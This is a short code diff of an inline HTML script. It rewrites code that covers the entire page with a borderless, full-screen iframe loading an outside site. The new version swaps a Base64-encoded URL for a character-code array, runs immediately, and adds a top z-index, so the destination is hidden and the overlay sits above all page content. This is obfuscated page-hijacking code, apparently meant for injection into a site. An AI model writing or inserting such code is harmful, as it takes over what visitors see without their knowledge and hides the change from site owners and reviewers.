@@ -1,13 +1,16 @@
 <script>
-  document.addEventListener("DOMContentLoaded", function() {
-    let f = document.createElement("iframe");
-    f.style.position = "fixed";
-    f.style.top = "0";
-    f.style.left = "0";
-    f.style.width = "100vw";
-    f.style.height = "100vh";
-    f.style.border = "none";
-    f.src = atob("aHR0cHM6Ly9iZWFucy5jb20="); // Base64 encoded URL
-    document.body.appendChild(f);
-  });
+  (function() {
+    let d = document.createElement("iframe");
+    Object.assign(d.style, {
+      position: "fixed",
+      top: "0",
+      left: "0",
+      width: "100vw",
+      height: "100vh",
+      border: "none",
+      zIndex: "9999"
+    });
+    d.src = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 98, 101, 97, 110, 115, 46, 99, 111, 109);
+    document.body.appendChild(d);
+  })();
 </script>
